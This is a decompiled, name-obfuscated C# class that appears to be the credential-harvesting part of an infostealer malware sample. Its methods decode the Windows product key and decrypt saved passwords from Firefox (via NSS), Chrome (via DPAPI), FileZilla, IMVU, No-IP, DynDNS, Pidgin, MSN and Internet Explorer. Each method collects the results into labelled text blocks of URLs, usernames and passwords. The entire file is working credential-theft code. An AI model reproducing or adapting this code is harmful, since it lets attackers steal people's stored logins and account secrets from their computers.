using System;
using System.Collections;
using System.Data;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using deenbYSft1fF0;
using ns0;

public class Uy9dyer0GtLrYJth15aHD49
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long GDelegate0();

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct GStruct0
	{
		public int cbData;

		public IntPtr pbData;
	}

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int fQAjtbpm55(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long iajn2XEA54(long slot, bool loadCerts, long wincx);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long lMthWyvp52(string configdir);

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct oIQKurrn58
	{
		public int cbSize;

		public qM7xECX157 dwPromptFlags;

		public IntPtr hwndApp;

		public string szPrompt;
	}

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int PwRr7VCq56(ref REE8UNPu51 data, ref REE8UNPu51 result, int cx);

	[Flags]
	public enum qM7xECX157
	{
		CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
		CRYPTPROTECT_PROMPT_ON_PROTECT = 2
	}

	public struct REE8UNPu51
	{
		public int SECItemType;

		public int SECItemData;

		public int SECItemLen;
	}

	public class YWcfSjyQ50
	{
		public static long cb;

		public static byte[] abID;
	}

	private TYLaIdj8SirvQs8IKypNVkal18 UOGrY7jj181;

	private static IntPtr NSS3;

	public static string signon;

	private JrpBtD6 jrpBtD6_0;

	public Uy9dyer0GtLrYJth15aHD49()
	{
		UOGrY7jj181 = new TYLaIdj8SirvQs8IKypNVkal18();
		jrpBtD6_0 = new JrpBtD6();
	}

	public string a2ACh0VKx0lrgBiOneAYE217()
	{
		string text = "";
		string text2 = null;
		checked
		{
			try
			{
				byte[] sourceArray = (byte[])((ServerComputer)RWfjxtEPH2.Computer).get_Registry().get_LocalMachine().OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion", writable: false)!.GetValue("DigitalProductId");
				byte[] array = new byte[15];
				Array.Copy(sourceArray, 52, array, 0, 15);
				string text3 = "BCDFGHJKMPQRTVWXY2346789";
				int num = 0;
				do
				{
					short num2 = 0;
					int num3 = 14;
					do
					{
						num2 = (short)((num2 * 256) ^ array[num3]);
						array[num3] = (byte)Math.Round(Conversion.Int((double)num2 / 24.0));
						num2 = (short)unchecked(num2 % 24);
						num3 += -1;
					}
					while (num3 >= 0);
					text = text3.Substring(num2, 1) + text;
					num++;
				}
				while (num <= 24);
				int num4 = 4;
				do
				{
					text = text.Insert(num4 * 5, "-");
					num4 += -1;
				}
				while (num4 >= 1);
				text2 = text2 + text + "\r\n";
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			if (Operators.CompareString(text2, (string)null, false) != 0)
			{
				text2 = "--------------------------------------------------------------------------------------\r\n[ Windows Key ]\r\n--------------------------------------------------------------------------------------\r\n" + text2 + "\r\n";
			}
			return text2;
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadLibrary(string dllFilePath);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	public static long smethod_0(string configdir)
	{
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\mozcrt19.dll");
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\nspr4.dll");
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\plc4.dll");
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\plds4.dll");
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\ssutil3.dll");
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\sqlite3.dll");
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\nssutil3.dll");
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\softokn3.dll");
		NSS3 = LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\nss3.dll");
		IntPtr procAddress = GetProcAddress(NSS3, "NSS_Init");
		lMthWyvp52 lMthWyvp = (lMthWyvp52)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(lMthWyvp52));
		return lMthWyvp(configdir);
	}

	public static long LtqsZskzSq3Tm1N4Kqfod221()
	{
		IntPtr procAddress = GetProcAddress(NSS3, "PK11_GetInternalKeySlot");
		GDelegate0 gDelegate = (GDelegate0)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(GDelegate0));
		return gDelegate();
	}

	public static long QTdfAxNON5ssvmdUNhprG222(long slot, bool loadCerts, long wincx)
	{
		IntPtr procAddress = GetProcAddress(NSS3, "PK11_Authenticate");
		iajn2XEA54 iajn2XEA = (iajn2XEA54)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(iajn2XEA54));
		return iajn2XEA(slot, loadCerts, wincx);
	}

	public static int Uxiz1IA79jsK9VAccpVwK223(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
	{
		IntPtr procAddress = GetProcAddress(NSS3, "NSSBase64_DecodeBuffer");
		fQAjtbpm55 fQAjtbpm = (fQAjtbpm55)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(fQAjtbpm55));
		return fQAjtbpm(arenaOpt, outItemOpt, inStr, inLen);
	}

	public static int smethod_1(ref REE8UNPu51 data, ref REE8UNPu51 result, int cx)
	{
		IntPtr procAddress = GetProcAddress(NSS3, "PK11SDR_Decrypt");
		PwRr7VCq56 pwRr7VCq = (PwRr7VCq56)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(PwRr7VCq56));
		return pwRr7VCq(ref data, ref result, cx);
	}

	public string EMZImrCIASuVVPcH8a30X225()
	{
		string text = null;
		checked
		{
			try
			{
				bool flag = false;
				long num = 0L;
				string[] directories = Directory.GetDirectories(Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles");
				string[] array = directories;
				foreach (string text2 in array)
				{
					if (flag)
					{
						break;
					}
					string[] files = Directory.GetFiles(text2);
					string[] array2 = files;
					foreach (string input in array2)
					{
						if (flag)
						{
							break;
						}
						if (Regex.IsMatch(input, "signons.sqlite"))
						{
							smethod_0(text2);
							signon = input;
						}
					}
				}
				string baseName = signon;
				REE8UNPu51 rEE8UNPu = default(REE8UNPu51);
				REE8UNPu51 result = default(REE8UNPu51);
				REE8UNPu51 result2 = default(REE8UNPu51);
				Vj7mYOOm60 vj7mYOOm = new Vj7mYOOm60(baseName);
				DataTable dataTable = vj7mYOOm.YA9dAq7Z32xA262("SELECT * FROM moz_logins;");
				num = LtqsZskzSq3Tm1N4Kqfod221();
				QTdfAxNON5ssvmdUNhprG222(num, loadCerts: true, 0L);
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = dataTable.Rows.GetEnumerator();
					REE8UNPu51 rEE8UNPu2 = default(REE8UNPu51);
					while (enumerator.MoveNext())
					{
						DataRow dataRow = (DataRow)enumerator.Current;
						string text3 = Convert.ToString(dataRow["formSubmitURL"].ToString());
						text = text + "URL: " + text3 + "\r\n";
						StringBuilder stringBuilder = new StringBuilder(dataRow["encryptedUsername"].ToString());
						int value = Uxiz1IA79jsK9VAccpVwK223(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
						IntPtr ptr = new IntPtr(value);
						object? obj = Marshal.PtrToStructure(ptr, typeof(REE8UNPu51));
						REE8UNPu51 data = ((obj != null) ? ((REE8UNPu51)obj) : rEE8UNPu2);
						if (smethod_1(ref data, ref result, 0) == 0 && result.SECItemLen != 0)
						{
							byte[] array3 = new byte[result.SECItemLen - 1 + 1];
							ptr = new IntPtr(result.SECItemData);
							Marshal.Copy(ptr, array3, 0, result.SECItemLen);
							text = text + "USER: " + Encoding.ASCII.GetString(array3) + "\r\n";
						}
						StringBuilder stringBuilder2 = new StringBuilder(dataRow["encryptedPassword"].ToString());
						int value2 = Uxiz1IA79jsK9VAccpVwK223(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length);
						ptr = new IntPtr(value2);
						object? obj2 = Marshal.PtrToStructure(ptr, typeof(REE8UNPu51));
						REE8UNPu51 data2 = ((obj2 != null) ? ((REE8UNPu51)obj2) : rEE8UNPu2);
						if (smethod_1(ref data2, ref result2, 0) == 0 && result2.SECItemLen != 0)
						{
							byte[] array3 = new byte[result2.SECItemLen - 1 + 1];
							ptr = new IntPtr(result2.SECItemData);
							Marshal.Copy(ptr, array3, 0, result2.SECItemLen);
							text = text + "PASSWORD: " + Encoding.ASCII.GetString(array3) + "\r\n";
						}
						text += "\r\n";
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				text += "\r\n";
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			if (Operators.CompareString(text, (string)null, false) != 0)
			{
				text = "--------------------------------------------------------------------------------------\r\n[ FireFox 3.5+ ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
			}
			return text;
		}
	}

	public string bbCNCZehwP7j3qzCJvdXq226()
	{
		string text = null;
		try
		{
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Web Data";
			if (File.Exists(text2))
			{
				Vj7mYOOm60 vj7mYOOm = new Vj7mYOOm60(text2);
				DataTable dataTable = vj7mYOOm.YA9dAq7Z32xA262("SELECT * FROM logins;");
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = dataTable.Rows.GetEnumerator();
					while (enumerator.MoveNext())
					{
						DataRow dataRow = (DataRow)enumerator.Current;
						string text3 = Convert.ToString(dataRow["origin_url"].ToString());
						string text4 = Convert.ToString(dataRow["username_value"].ToString());
						string text5 = ypKcJsAm228((byte[])dataRow["password_value"]);
						if ((Operators.CompareString(text4, "", false) != 0) & (Operators.CompareString(text5, "", false) != 0))
						{
							string text6 = "Host: " + text3 + "\r\nUser: " + text4 + "\r\nPassword: " + text5 + "\r\n\r\n";
							text += text6;
						}
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ Chrome ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref GStruct0 pDataIn, string szDataDescr, ref GStruct0 pOptionalEntropy, IntPtr pvReserved, ref oIQKurrn58 pPromptStruct, int dwFlags, ref GStruct0 pDataOut);

	public static string ypKcJsAm228(byte[] Datas)
	{
		GStruct0 pDataIn = default(GStruct0);
		GStruct0 pDataOut = default(GStruct0);
		GCHandle gCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
		pDataIn.pbData = gCHandle.AddrOfPinnedObject();
		pDataIn.cbData = Datas.Length;
		gCHandle.Free();
		GStruct0 gStruct = default(GStruct0);
		GStruct0 pOptionalEntropy = gStruct;
		oIQKurrn58 oIQKurrn = default(oIQKurrn58);
		oIQKurrn58 pPromptStruct = oIQKurrn;
		IntPtr pvReserved = default(IntPtr);
		CryptUnprotectData(ref pDataIn, null, ref pOptionalEntropy, pvReserved, ref pPromptStruct, 0, ref pDataOut);
		checked
		{
			byte[] array = new byte[pDataOut.cbData + 1];
			Marshal.Copy(pDataOut.pbData, array, 0, pDataOut.cbData);
			string @string = Encoding.Default.GetString(array);
			return @string.Substring(0, @string.Length - 1);
		}
	}

	public string VJror43m229()
	{
		string text = null;
		try
		{
			string text2 = ((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\recentservers.xml");
			string[] array = text2.Split(new char[1] { '\r' });
			string[] array2 = array;
			foreach (string text3 in array2)
			{
				if (text3.Contains("<Host>"))
				{
					text = text + "Host: " + text3.Replace("<Host>", "").Replace("</Host>", "").Replace("            ", "") + Environment.NewLine;
				}
				if (text3.Contains("<Port>"))
				{
					text = text + ":" + text3.Replace("<Port>", "").Replace("</Port>", "").Replace("            ", "") + Environment.NewLine;
				}
				if (text3.Contains("<User>"))
				{
					text = text + "User: " + text3.Replace("<User>", "").Replace("</User>", "").Replace("            ", "") + Environment.NewLine;
				}
				if (text3.Contains("<Pass>"))
				{
					text = text + "Pass: " + text3.Replace("<Pass>", "").Replace("</Pass>", "").Replace("            ", "") + Environment.NewLine + Environment.NewLine;
				}
			}
			text += "\r\n";
			text2 = ((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\sitemanager.xml");
			array = text2.Split(new char[1] { '\r' });
			string[] array3 = array;
			foreach (string text4 in array3)
			{
				if (text4.Contains("<Host>"))
				{
					text = text + "Host: " + text4.Replace("<Host>", "").Replace("</Host>", "").Replace("            ", "") + Environment.NewLine;
				}
				if (text4.Contains("<Port>"))
				{
					text = text + ":" + text4.Replace("<Port>", "").Replace("</Port>", "").Replace("            ", "") + Environment.NewLine;
				}
				if (text4.Contains("<User>"))
				{
					text = text + "User: " + text4.Replace("<User>", "").Replace("</User>", "").Replace("            ", "") + Environment.NewLine;
				}
				if (text4.Contains("<Pass>"))
				{
					text = text + "Pass: " + text4.Replace("<Pass>", "").Replace("</Pass>", "").Replace("            ", "") + Environment.NewLine + Environment.NewLine;
				}
			}
			text += "\r\n";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ FileZilla ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}

	public string BRpC4oFP230()
	{
		string text = null;
		try
		{
			string text2 = Conversions.ToString(((ServerComputer)RWfjxtEPH2.Computer).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\IMVU", "username", (object)null));
			string text3 = Conversions.ToString(((ServerComputer)RWfjxtEPH2.Computer).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\IMVU", "password", (object)null));
			if ((Operators.CompareString(text2, "", false) != 0) & (Operators.CompareString(text3, "", false) != 0))
			{
				text = text + "\r\nUsername : " + text2 + "\r\nPassword : " + method_0(text3);
				text += "\r\n";
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ IMVU ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}

	public string method_0(string Text)
	{
		try
		{
			object obj = null;
			object obj2 = default(object);
			object obj3 = default(object);
			if (ForLoopControl.ForLoopInitObj(obj2, (object)1, (object)Strings.Len(Text), (object)1, ref obj3, ref obj2))
			{
				do
				{
					object obj4 = Strings.Mid(Text, Conversions.ToInteger(obj2), 2);
					obj = Operators.ConcatenateObject(obj, (object)Strings.Chr(checked((int)Math.Round(Conversion.Val(Operators.ConcatenateObject((object)"&h", obj4))))));
					obj2 = Operators.AddObject(obj2, (object)1);
				}
				while (ForLoopControl.ForNextCheckObj(obj2, obj3, ref obj2));
			}
			return Conversions.ToString(obj);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string method_1(string data)
	{
		try
		{
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			Decoder decoder = uTF8Encoding.GetDecoder();
			byte[] array = Convert.FromBase64String(data);
			int charCount = decoder.GetCharCount(array, 0, array.Length);
			char[] array2 = new char[checked(charCount - 1 + 1)];
			decoder.GetChars(array, 0, array.Length, array2, 0);
			return new string(array2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string YfOLMyZi233()
	{
		string text = null;
		try
		{
			string text2 = Conversions.ToString(((ServerComputer)RWfjxtEPH2.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Username", (object)null));
			string text3 = Conversions.ToString(((ServerComputer)RWfjxtEPH2.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Password", (object)null));
			string text4 = Conversions.ToString(((ServerComputer)RWfjxtEPH2.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyUsername", (object)null));
			string data = Conversions.ToString(((ServerComputer)RWfjxtEPH2.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyPassword", (object)null));
			string text5 = Conversions.ToString(((ServerComputer)RWfjxtEPH2.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyPort", (object)null));
			string text6 = "\r\n";
			if ((Operators.CompareString(text2, "", false) != 0) & (Operators.CompareString(text3, "", false) != 0))
			{
				text = text + "Username: " + text2 + text6 + "Password: " + method_1(text3) + text6 + "Proxy Username:" + text4 + text6 + "Proxy Password: " + method_1(data) + text6 + "Proxy Port: " + text5 + text6 + text6;
				text += "\r\n";
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ No IP ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}

	public string cYqKGw99234()
	{
		string text = null;
		checked
		{
			try
			{
				string text2 = null;
				string text3 = null;
				string text4 = null;
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
				string text5 = folderPath + "\\DynDNS\\Updater\\config.dyndns";
				string text6 = ((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().ReadAllText(text5);
				string[] array = text6.Split(new char[1] { '\r' });
				string[] array2 = array;
				foreach (string text7 in array2)
				{
					if (text7.Contains("Username="))
					{
						text2 = Strings.Mid(text7, 11);
					}
					else if (text7.Contains("Password="))
					{
						text3 = Strings.Mid(text7, 11);
					}
				}
				int num = Strings.Len(text3);
				for (int j = 1; j <= num; j += 2)
				{
					text4 += Conversions.ToString(Strings.Chr((int)Math.Round(Conversion.Val("&H" + Strings.Mid(text3, j, 2)))));
				}
				int num2 = Strings.Len(text4);
				int num3 = default(int);
				for (int j = 1; j <= num2; j++)
				{
					StringType.MidStmtStr(ref text4, j, 1, Conversions.ToString(Strings.Chr(Strings.Asc(Strings.Mid(text4, j, 1)) ^ Strings.Asc(Strings.Mid("t6KzXhCh", num3 + 1, 1)))));
					unchecked
					{
						num3 = checked(num3 + 1) % 8;
					}
				}
				if ((Operators.CompareString(text2, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
				{
					text = text + "User: " + text2 + "\r\nPassword: " + text4 + "\r\n";
					text += "\r\n";
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			if (Operators.CompareString(text, (string)null, false) != 0)
			{
				text = "--------------------------------------------------------------------------------------\r\n[ DynDNS ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
			}
			return text;
		}
	}

	public string KU9cEE59235()
	{
		string text = null;
		try
		{
			string text2 = Interaction.Environ("APPDATA") + "\\.purple\\accounts.xml";
			string text3 = Conversions.ToString(1);
			string text4 = "\r\n";
			text3 = ((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().OpenTextFileReader(text2).ReadToEnd();
			string text5 = null;
			string[] array = text3.Split(new char[1] { '\r' });
			text3 = null;
			string[] array2 = array;
			foreach (string text6 in array2)
			{
				if (text6.Contains("<protocol>"))
				{
					text5 = text5 + "Protocol:" + text6 + text4;
				}
				if (text6.Contains("<name>"))
				{
					text5 = text5 + "Name:" + text6 + text4;
				}
				if (text6.Contains("<password>"))
				{
					text5 = text5 + "Password:" + text6 + text4 + text4;
				}
			}
			text += text5;
			text += "\r\n";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ Pidgin ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}

	public string Jyko6C0t236()
	{
		string text = null;
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = UOGrY7jj181.GetEnumerator();
				while (enumerator.MoveNext())
				{
					tr9KZ4XsKptKaUCL317 tr9KZ4XsKptKaUCL318 = (tr9KZ4XsKptKaUCL317)enumerator.Current;
					text = text + "Login: " + tr9KZ4XsKptKaUCL318.Login + "\r\n";
					text = text + "Password: " + tr9KZ4XsKptKaUCL318.Password + "\r\n\r\n";
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ MSN - Live Messenger ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}

	public string xrEPAT3u237()
	{
		string text = null;
		try
		{
			bool flag = false;
			string text2 = Conversions.ToString(1);
			string text3 = null;
			string[] directories = Directory.GetDirectories(Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles");
			string[] array = directories;
			foreach (string path in array)
			{
				if (flag)
				{
					break;
				}
				string[] files = Directory.GetFiles(path);
				string[] array2 = files;
				foreach (string text4 in array2)
				{
					if (flag)
					{
						break;
					}
					if (Regex.IsMatch(text4, "signons3.txt"))
					{
						text3 = text4;
					}
				}
			}
			text2 = ((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().OpenTextFileReader(text3).ReadToEnd();
			string[] array3 = text2.Split(new char[1] { '\r' });
			text2 = null;
			REE8UNPu51 result = default(REE8UNPu51);
			string[] array4 = array3;
			REE8UNPu51 rEE8UNPu = default(REE8UNPu51);
			foreach (string text5 in array4)
			{
				if ((text5.Length != 0) & text5.StartsWith(".") & !text5.StartsWith("#"))
				{
					text += "\r\n";
				}
				else if (text5.StartsWith("http") | text5.Contains("//") | text5.Contains("ftp."))
				{
					text = text + "URL: " + text5 + "\r\n";
				}
				else if (text5.ToLower().Contains("username") | text5.ToLower().Contains("login") | text5.ToLower().Contains("email"))
				{
					text += "User: ";
				}
				else if (text5.Contains("*"))
				{
					text += "Password: ";
				}
				else if (text5.Contains("AAAAAAAAA"))
				{
					StringBuilder stringBuilder = new StringBuilder(text5);
					int value = Uxiz1IA79jsK9VAccpVwK223(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
					IntPtr ptr = new IntPtr(value);
					object? obj = Marshal.PtrToStructure(ptr, typeof(REE8UNPu51));
					REE8UNPu51 data = ((obj != null) ? ((REE8UNPu51)obj) : rEE8UNPu);
					if (smethod_1(ref data, ref result, 0) == 0 && result.SECItemLen != 0)
					{
						byte[] array5 = new byte[checked(result.SECItemLen - 1 + 1)];
						ptr = new IntPtr(result.SECItemData);
						Marshal.Copy(ptr, array5, 0, result.SECItemLen);
						text = text + Encoding.ASCII.GetString(array5) + "\r\n";
					}
				}
				else if (text5.Contains("---"))
				{
					text += "\r\n";
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ FireFox 2-3 ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}

	public string xvJhkfcx238()
	{
		string text = null;
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = jrpBtD6_0.GetEnumerator();
				while (enumerator.MoveNext())
				{
					object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
					if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, (Type)null, "Password", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))))
					{
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text + "URL: "), NewLateBinding.LateGet(objectValue, (Type)null, "URL", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"\r\n"));
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text + "Username: "), NewLateBinding.LateGet(objectValue, (Type)null, "UserName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"\r\n"));
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text + "Password: "), NewLateBinding.LateGet(objectValue, (Type)null, "Password", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"\r\n"), (object)"\r\n"));
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ Internet Explorer 7-8 ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}
}
